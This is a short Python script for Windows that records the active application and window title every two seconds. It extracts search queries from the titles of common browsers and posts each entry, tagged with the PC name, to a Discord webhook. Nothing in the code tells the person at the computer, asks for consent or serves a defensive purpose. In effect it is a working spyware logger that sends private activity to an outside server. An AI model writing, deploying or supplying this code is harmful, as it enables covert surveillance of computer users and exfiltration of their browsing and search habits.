import psutil
import requests
import time
import win32gui
import win32process
import re
import socket
from datetime import datetime

# Discord Webhook URL
WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"

# Get PC name
PC_NAME = socket.gethostname()

# Function to get active window title
def get_active_window_title():
    hwnd = win32gui.GetForegroundWindow()
    _, pid = win32process.GetWindowThreadProcessId(hwnd)
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['pid'] == pid:
            return proc.info['name'], win32gui.GetWindowText(hwnd)
    return None, None

# Function to extract search query from browser titles
def extract_search_query(title):
    search_patterns = [
        r' - Google Search',
        r' - Bing',
        r' - Yahoo Search',
        r' - DuckDuckGo',
        r' - Ecosia',
    ]
    
    for pattern in search_patterns:
        if re.search(pattern, title):
            return re.sub(pattern, '', title)
    return None

# Function to send logs to Discord
def send_to_discord(message):
    payload = {"content": message}
    requests.post(WEBHOOK_URL, json=payload)

# Monitoring loop
def monitor():
    while True:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        app_name, window_title = get_active_window_title()
        
        if app_name:
            log_message = f"[{timestamp}] {PC_NAME} - User opened {app_name}: {window_title}"
            
            if app_name in ["chrome.exe", "firefox.exe", "msedge.exe", "opera.exe", "brave.exe"]:
                search_query = extract_search_query(window_title)
                if search_query:
                    log_message = f"[{timestamp}] {PC_NAME} - User searched: {search_query}"
            
            send_to_discord(log_message)
        
        time.sleep(2)  # Reduced sleep for near real-time logging

if __name__ == "__main__":
    monitor()
